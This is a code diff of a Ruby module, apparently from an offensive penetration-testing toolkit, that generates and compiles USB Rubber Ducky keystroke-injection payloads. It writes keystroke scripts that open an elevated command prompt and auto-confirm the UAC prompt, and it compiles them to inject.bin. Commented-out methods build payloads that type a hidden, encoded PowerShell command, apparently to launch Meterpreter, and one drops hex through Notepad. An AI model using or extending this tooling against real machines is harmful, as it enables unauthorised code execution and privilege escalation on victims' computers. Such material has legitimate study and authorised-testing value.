@@ -3,19 +3,29 @@ require 'core'
 include Core::Commands
 module Ducky
   class Writer
-    def initialize
-      x = 0
-      options.each do |op|
-        puts "#{x + 1}) #{op}"
+    def menu
+      options.each do |key, ops|
+        puts "#{key}) #{ops}"
       end
-      choice = rgets('Choice: ', 3)
-      choice - 1
+      rgets('Choice: ', '3')
+    end
+
+    def write(choice)
+      options_lambda[choice.to_sym].call
     end
 
     private
 
+    def options_lambda
+      { :'1' => -> () { admin_with_uac },
+        :'2' => -> () { admin_with_out_uac },
+        :'3' => -> () { low_priv } }
+    end
+
     def options
-      %w(admin_uac, admin_no_uac, low_priv)
+      { :'1' => 'admin_with_uac',
+        :'2' => 'admin_with_out_uac',
+        :'3' => 'low_priv' }
     end
 
     def admin_with_uac
@@ -26,7 +36,7 @@ module Ducky
       cmd << "CTRL-SHIFT ENTER\n"
       cmd << "DELAY 2000\n"
       cmd << "ALT y\n"
-      cmd << 'DELAY 2000'
+      cmd << "DELAY 2000\n"
     end
 
     def admin_with_out_uac
@@ -35,7 +45,7 @@ module Ducky
       cmd << "DELAY 200\n"
       cmd << "STRING cmd\n"
       cmd << "CTRL-SHIFT ENTER\n"
-      cmd << 'DELAY 2000'
+      cmd << "DELAY 2000\n"
     end
 
     def low_priv
@@ -44,35 +54,56 @@ module Ducky
       cmd << "DELAY 500\n"
       cmd << "STRING cmd\n"
       cmd << "ENTER\n"
-      cmd << 'DELAY 500'
+      cmd << "DELAY 500\n"
+    end
+  end
+  class Compile
+    include Core::Files
+    def initialize(file_name)
+      language = language_options
+      print_info('Creating Bin File!')
+      cmd = compile_cmd(file_name, language)
+      output = `#{cmd}`
+      if output =~ /Exception/
+        print_error('Wrong Version of Java')
+        print_info('Run update-alternatives --config java and select Java 7')
+        exit
+      else
+        print_info(output)
+        print_success('Bin File Created!')
+      end
+    end
+
+    private
+
+    def pick_language
+      language_options.each do |key, lang|
+        puts "#{key}) #{lang}"
+      end
+      rgets('Choice: ', 1)
+    end
+
+    def language_options
+      { :'1' => 'us.properties', :'2' => 'be.properties',
+        :'3' => 'it.properties', :'4' => 'dk.properties',
+        :'5' => 'es.properties', :'6' => 'uk.properties',
+        :'7' => 'sv.properties', :'8' => 'ru.properties',
+        :'9' => 'pt.properties', :'10' => 'de.properties',
+        :'11' => 'no.properties', :'12' => 'fr.properties' }
+    end
+
+    def compile_cmd(file_name, language)
+      cmd = "java -jar #{duck_encode_file}encoder.jar -i "
+      cmd << "#{text_path}#{file_name} -o #{file_root}/inject.bin -l "
+      cmd << "#{language_dir}#{language} 2>&1"
     end
   end
 end
-#   def admin_with_uac
-#     "DELAY 3000\nCTRL ESC\nDELAY 200\nSTRING cmd\nCTRL-SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 2000"
-#     #"DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500"
-#   end
-#   def admin_with_out_uac
-#     "DELAY 2000\nCTRL ESC\nDELAY 200\nSTRING cmd\nCTRL-SHIFT ENTER\nDELAY 2000"
-#     #"DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500"
-#   end
-#   def low_priv
-#     "DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500"
-#   end
 #   def notepad_hex
 #     "DELAY 2000\nGUI r\nDELAY 500\nSTRING notepad.exe\nENTER\nDELAY 500"
 #   end
 #   def save_notepad
 #     "CTRL s\n#{temp_path}\nEnter\n"
-#   end
-#   def ducky_fast_meterpreter_low(powershell_command)
-#     File.open("#{text_path}#{fast_meterpreter_file}",'w') {|f| f.write("#{low_priv}\nSTRING #{powershell_command}\nENTER")}
-#   end
-#   def ducky_fast_meterpreter_uac(powershell_command)
-#     File.open("#{text_path}#{fast_meterpreter_file}",'w') {|f| f.write("#{admin_with_uac}\nSTRING #{powershell_command}\nENTER")}
-#   end
-#   def ducky_fast_meterpreter_no_uac(powershell_command)
-#     File.open("#{text_path}#{fast_meterpreter_file}",'w') {|f| f.write("#{admin_with_out_uac}\nSTRING #{powershell_command}\nENTER")}
 #   end
 #   def ducky_meterpreter_low(encoded_command)
 #     #File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
@@ -121,35 +152,5 @@ end
 #   end
 #   def ducky_hex_low(hex_string,encoded_command)
 #     File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{notepad_hex}\n#{hex_string}\n#{save_notepad}\n#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
-#   end
-#   def language_select
-#     languages = { :'1' => 'us.properties', :'2' => 'be.properties', :'3' => 'it.properties', :'4' => 'dk.properties', :'5' => 'es.properties', :'6' => 'uk.properties', :'7' => 'sv.properties' ,
-#                   :'8' => 'ru.properties', :'9' => 'pt.properties', :'10' => 'de.properties', :'11' => 'no.properties', :'12' => 'fr.properties'}
-#     user_pick = Readline.readline("#{get_input("Would you like to change the keyboard layout?[yes/no] ")}",true)
-#     if user_pick == 'no' or user_pick == ''
-#       return languages[:"#{1}"]
-#     else
-#       language_pick = language_menu
-#       if language_pick == nil
-#         print_error("Not a valid choice using #{languages[:"#{1}"]}\n")
-#         return languages[:"#{1}"]
-#       else
-#         print_info("Using #{languages[:"#{language_pick}"]}\n")
-#         return languages[:"#{language_pick}"]
-#       end
-#     end
-#   end
-#   def compile_ducky(file_name)
-#     language = language_select
-#     print_info("Creating Bin File!\n")
-#     output = `java -jar #{duck_encode_file}encoder.jar -i #{text_path}#{file_name} -o #{file_root}/inject.bin -l #{language_dir}#{language} 2>&1`
-#     if output =~ /Exception/
-#       print_error("Wrong Version of Java\n")
-#       print_info("Run update-alternatives --config java and select Java 7\n")
-#       exit
-#     else
-#       print_info(output)
-#       print_success("Bin File Created!\n")
-#     end
 #   end
 # end
